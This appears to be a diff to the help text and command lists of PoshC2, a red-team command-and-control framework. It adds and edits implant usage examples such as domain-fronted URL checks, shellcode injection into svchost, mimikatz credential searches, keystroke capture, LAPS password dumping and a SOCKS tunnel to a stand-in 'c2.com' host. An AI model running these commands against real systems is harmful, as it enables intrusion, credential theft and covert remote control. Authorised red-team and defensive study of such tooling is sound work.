@@ -246,6 +246,7 @@ posh_help1 = Colours.GREEN + """
 Implant Features:
 =====================
 ps
+invoke-urlcheck -urls https://api.hsbc.com,https://d36xb1r83janbu.cloudfront.net -domainfront d2argm04ypulrn.cloudfront.net,d36xb1r83janbu.cloudfront.net -uri /en-gb/surface/accessories/
 searchhelp mimikatz
 searchhistory invoke-mimikatz
 label-implant <newlabel>
@@ -262,6 +263,7 @@ turtle 60s / turtle 30m / turtle 8h
 kill-implant
 hide-implant
 unhide-implant
+loadpowerstatus
 get-proxy
 get-computerinfo
 unzip <source file> <destination folder>
@@ -483,7 +485,8 @@ migrate -procid 4444
 migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
 migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
 inject-shellcode -x86 -procid 5634 -parentId 1111
-inject-shellcode -x64 -parentId 1111 -procpath 'c:\windows\system32\svchost.exe' -suspended
+inject-shellcode -x64 -parentId 1111 -procpath 'c:\\windows\\system32\\svchost.exe' -suspended
+get-injectedthread
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
@@ -526,7 +529,7 @@ Hosted-Files:
 ====================
 show-hosted-files
 add-hosted-file
-del-hosted-file
+disable-hosted-file
 enable-hosted-file
 
 Server Commands:
@@ -570,7 +573,7 @@ PRECOMMANDS = ['list-urls', 'show-urls', 'add-autorun', 'list-autorun', 'del-aut
                'show-serverinfo', 'history', 'generate-reports', 'generate-csvs', 'set-pushover-applicationtoken', 'set-pushover-userkeys', 'set-defaultbeacon',
                'listmodules', 'pwnself', 'creds', 'createnewpayload', 'createnewshellcode', 'createproxypayload', 'listmodules', "set-killdate",
                'createdaisypayload', 'turnoff-notifications', 'turnon-notifications', 'tasks', 'cleartasks', "opsec", "message",
-               "show-hosted-files", "add-hosted-file", "del-hosted-file", "enable-hosted-file", "kill", "get-killdate", "get-opsec-event", "add-opsec-event", "del-opsec-event"]
+               "show-hosted-files", "add-hosted-file", "disable-hosted-file", "enable-hosted-file", "kill", "get-killdate", "get-opsec-event", "add-opsec-event", "del-opsec-event"]
 
 # post help commands powershell implant
 COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
@@ -596,7 +599,7 @@ COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
             "invoke-wmievent", "remove-wmievent", "get-wmievent", "invoke-smbclient", "get-keystrokedata", "unhidefile", "hidefile", "remove-label", "label-implant",
             'invoke-psexecpayload', 'invoke-wmijspayload', 'invoke-wmipayload', 'invoke-dcompayload',
             "get-ipconfig", 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker",
-            "enable-rotation", "get-rotation", "invoke-urlcheck", "searchhistory"]
+            "get-powerstatus", "loadpowerstatus", "get-injectedthread", "enable-rotation", "get-rotation", "invoke-urlcheck", "searchhistory"]
 
 # post help commands python implant
 UXCOMMANDS = ["label-implant", "remove-label", "unhide-implant", "hide-implant", "help", "searchhelp", "python", "loadmodule",
